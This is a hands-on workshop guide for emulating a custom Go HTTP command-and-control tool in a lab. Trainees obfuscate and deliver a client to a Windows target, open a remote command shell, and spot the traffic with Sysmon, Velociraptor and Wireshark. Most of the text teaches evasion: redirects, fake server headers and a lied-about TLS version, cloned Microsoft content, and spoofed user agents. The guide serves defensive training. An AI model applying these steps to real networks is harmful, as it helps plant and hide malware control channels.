# HTTP Workshop Lab


# Attack Desktop
##
1. In the Attack Desktop, open a terminal, navigate to the  ironcat_attack/c2/ichttpc2 folder.
`cd /home/pslearner/workshop/ironcat_attack/c2/ichttpc2/client`

2. Notice the already compiled client.exe file.  Check it's md5 hash using md5sum.
`md5sum client.exe`

3. Now use garble to generate a new version with obfuscation.
`garble -tiny -literals build -ldflags='-s -w' client.go`

4. Time to move the payload over to the Windows Target. Host the file using python http simple server.
`python3 -m http.server`

5. Use the drop down in the top left to connect to the Windows Target device.

6. Open a firefox browser window and browse to http:172.32.14.10:8000

7. Click the client folder, and then again click **client.exe** to download it to the device.

8. If there are warnings from smart screen, acknoledge them and choose "keep anyway"
Note: this is not the same service as windows defender, it is an artifact of us using the browser to move it over, not the payload being caught by anti-virus.


Before you run the client, you need to start the server, that makes sense right??

## Run the Server

1. Swap back to the Attack Desktop.

2. In the terminal window with the ironcat_attack folder open, stop the python server with `ctrl+c`, and change to the server directory.
`cd /home/pslearner/workshop/ironcat_attack/c2/ichttpc2/server`

3. This side does not require obfuscation, so you can simply run the pre-compiled binary.
`sudo ./server`

Now let's create a happy connection.

## Run the client

1. Swap back to the Windows Target.

2. Use the desktop icon for CMD. Right click, and choose 'Run As Administrator'

3. Change directory to the downloads folder. (This one is a little tricky.)
`cd C:\Users\pslearner.PS-WIN-1\Downloads`

4. Run the client.
`client.exe`
Note: Unless something has changed significantly for the worse for my workshop, you should have ZERO notifications from anti-virus.

5. Swap back to your Attack Desktop, inpsect the terminal where you ran the server executable. You will see connections from the client.  It will checkin ever 10 seconds. You will then be queried for input for "mode" 
    - if you input 0. It will continue to checkin
    - Input 1, and it will perform os enumeration
    - input 2 and it will return asking you for a command, full shell
For the purpose of this part of the workshop, you don't need to interact, time to see if you can identifie artifiacts of this communication.

## Idnetify IOCs

You have many tools as your disoposal. Velociraptor is most powerful, but sysmon as well as the full sysinternals sweet is available.  The point of this workshop is emulation but I will give a bit of time for you to be able to use the tools available and see what ways people come up with to identify the activity.

REMEMBER! You know what you have done, but how would you specifically identify this activity as malicious in a enterprise environment?  The point of this, is for you to take this home, and truly test your technology, people, and processes.

## Sysmon
- Symon is already installed, but you can find the Event Log in the Windows Event Logs.
- Sysinternals is in the PATH, so you can call the tools from the command line
    - procexp
    - tcpview
- Wireshark is on the desktop
- To start velociraptor and run hunts follow the following steps.
    - Open CMD as administrator
    - Chand directory: `cd c:\Users\Public\Desktop\LAB_FILES\`
    - Run velociraptor: `velociraptor.exe gui`
    - Open Firefox and browse to localhost:8889
    - Username: admin Password: passowrd
    - Use the tool bar on the left to run hunts.
    - View the results of your hunts

## Questions to Ask

What are the ports involved, and why do stand out?

Is there anything in the http traffic that would stand out?

If it is being actively used for c2, what kind of signature could you create?


[HTTP C2 IOCs](./HTTPc2_IOCs.md)


In VSCode navigate to the  ichttpc2>server folder, and open the server.go file.

Open a terminal in VSCode by pressing "ctrl+shift+`"

Change directory to the server directory.
`cd ichttpc2/server`

Run the server.
`sudo go run server.go`

> When the program displays "Enter Mode:" enter 0.  For the rest of this workshop, 0 will trigger checkin activity, 1 will put the clients into OS Enumeration, and 2 will initiate command execution.

# Server
## Detection Evasion
Open a browser (firefox), and browse to your server address 0.0.0.0. Click applications, then Web Browser, it opens FF.
> Notice it says Ironcat Server Initiated. That is not really what you want people to see if they happen to notice traffic to your malware c2 server right? So let's change it.


### Server Re-Direct
Back in VScode. Take a look at the server.go file you opened.

In the code, uncomment the following code around line 71 that starts with "c.Redirect".  And then use "//" to comment out the line that starts with "HTML". Then save the new server.go file with ctrl+s.
> Hint "//" is used for 1 line comments.

In the VSCode Terminal. Kill the server with ctrl+c and then restart it by re running the `go run server.go` command. Agen enter "0" when it says "Enter Mode".

Again browse to the server from the browser.

>Now this server redirects to another location. This is the same as the default behavior of the recently researched chinese manjusaka c2 that is supposed to be a replacement for cobalts strike.  

To the person using the browser this is only odd in that you are reffered to from a strange location.

If you check this in wireshark. And browse again, but this time browse to "http://localhost"
`wireshark&`  
> Capture on the loopback interface wth the capture filter set to "tcp port http" for localhost.


You can also use curl.
`curl http://localhost -v`

> Notice the 301 in the response, this is your indicator that this is redirecting you to the provided location. You are even redirected to "www".microsoft.com, so redirection is common. Nothing to see here.

Stop the wireshark capture, no need to save.

### Server Headers
Normal servers provide more headers than you see in the response as well. So this still doesn't look like a normal server. You check this by opening a browser outside of the lab. Open dev tools. (F12 most browsers.) And select the network tab. Now browse to Mircosoft.com

Select the initial request and view the response headers.

You will see something like:

```
content-length: 0
date: Sun, 07 Aug 2022 16:12:50 GMT
location: https://www.microsoft.com/en-us/
strict-transport-security: max-age=31536000
tls_version: tls1.3
x-rtag: ARRPrd
```

Time to add a few headers of your own so your redirect looks legit. In VSCode, uncomment the line ~66 adding three headers. Location and date already exist, you can see those in the curl response. Looks like we need to add a few other options.

Uncomment the additional headers and re-run the server.
`go run server.go`

Use curl to check the headers for the redirect now.
`curl http://localhost -v`
> Now this is started to look pretty "normal" of course you can make the interaction even more normal by copying the actual microsoft server behavior exactly. But notice how we lie about our tls version? 

You can take a look in wireshark at the traffic  once again with the same mehtods as above and see the same headers.

But this still isn't quite right.

### Server Content
A brief note on contnet. When we decide to use something other than the body of the messages to send C2 information back and forth. You want the content to not be something like "Ironcat Server Initiating" so that it is more realistic. In your browser, not in the lab, browse to Microsoft.com one more time.  Now use file>save to save a copy of the page. (No it won't be a perfect copy)  

Now open the file on your system.  See it isn't a perfect copy...but it isn't terrible, and when you analyze this traffic and see this code in the packets, it makes it looks even more legit.

This is what is saved in the directory you are running the server.  Change the name of the current index.html file to "index-old.html"

Now change the name of the microsoft.html file to index.html.

Restart the golang server.

Run curl against your server.
> Now this looks like normal web traffic!  

## A quick note about Ports

Notice at the bottom of the code that referecnes port 80 being used.  Let's talk about that for a moment.


# Client
Enough about the server, this thing isn't as fun if you just host it by yourself...you need clients!

Find your server IP.
`ip addr`
(It will start with 172.31.)

## Initial Conversation
Compile the server. 
`go build server.go`

This will generate an elf file. In a separate terminal. Browse to the directory housing the elf file you just created.

Then in that same terminal windows, use chmod to make the file executable.
`chmod +x server`

Now, run the executable.
`./server`
> It should be error free and look the same as the other times you ran the server.

Back in VSCode, open the client.go file.

In the top of the file make sure the variable "ip" is set to 127.0.0.1.

In the VSCode terminal, run the client to make sure it connects.
`go run client.go`

With success it is time to compile the client and move it over to the Windows machine.  But first change the IP to the IP of your server (It should be X)

Now in the VScode Terminal run the following command:
`sudo GOOS=windows GARCH=x64 go build client.go`
>This should cross compile the binary to run on windows.

In the same terminal run the following command to host the file.
`python -m http.server`

Swap to the Windows Victim Desktop.

Open a browser, and browse to the IP of the linux server. at port 8000  http://<server-ip>:8000, and click the client.exe file to download.

Open a commnad line terminal on windows. 

Change directory to where you downloaded the file.
`cd c:\Users\Administrator\Downloads\`

Run the client in the terminal.
`./client.exe`

Swap back to the linux desktop server to make sure the terminal hosting your server elf file shows the connection.  Make sure to give it responses as it comes in every 30 seconds or so.  If they build up you may need to restart the server and client.

## User Agent
With C2 up and running. Time to take a look at the traffic. In a new terminal open wireshark.
`sudo wireshark&`
> Make sure you use sudo so you have rights to the interfaces.

Start capturing on interface eth0.

Filter for 'http'

Once you see your connections coming in. Make sure to interact with the c2 a bit.  Explore the traffic by right clicking and using "follow HTTP"
> Take a look atthe user agent field. Go-http-Client is commonly used for this sort of thing and is a bit of a dead give away. 

User Agents are used as indicators but take a look at how easy this is to change. 

Stop capture in wireshark.  

On the windows device, stop the client from running.

In VSCode on your Linux Desktop, with the client.go open. Uncomment the var that says User-agent.  Line ~23

Do the same for each function.  Checkin, OsEnum and C2.  Uncomment the line that says "req.Header.Set("User-Agent", user_agent)
Line ~56, 91, 112

Save and recompile.
`sudo GOOS=windows GARCH=x64 go build client.go`
> You may need to rename the exisiting file named client.exe in that location or atleast ensure it was over written.

Re-host for with Windows
`python -m http.server`

On the windows victim server, again browse to the location and download and run the new client.exe file. You may also need to re-run the server elf file on the linux server.

Restart Wireshark. Filter for http.

Interact with the c2 server.

Check ont the Wireshark traffic.
> You will notice a brand new user agent.  And just how easy that is to change. Also, something you may see being set in the code.

## Request Headers

Something elese you may have notices is that headers are kinda light on the http side.

Shut down the client on the Windows Machine.

On the Linux server, stop capturing on wireshark.

For reference, on your own browser, open up dev tools to the network tab. Browse to microsoft.com. Find the transaction for en-us. Look atthe request headers...Thos seem pretty signifacnt. So our bare bones headers are a little sparse. Time to emulate a bit more.

Back in VSCode on the linux server, look at lines ~59-61 and uncomment them. They all start with "req.Header.Add"

Save and recompile.
`sudo GOOS=windows GARCH=x64 go build client.go`
> You may need to rename the exisiting file named client.exe in that location or atleast ensure it was over written.

Re-host for with Windows
`python -m http.server`

Run the new client.

On the linux server, run wireshark and check out the new traffic pattern.  Now it is starting to be difficult to decipher this from real microsoft traffic (except for one big thing).  Play around with C2 a bit while watching the traffic pattern in wireshark.

Setting the mode to 1 will send back os enumeration data. 2 will ask you for a command that will run on the device.
>Notice that the command information is not obfuscated at all!

## Hiding the Content

Could use encryption, no not base64!  Or we can just use HTTPS. You will work with that next.











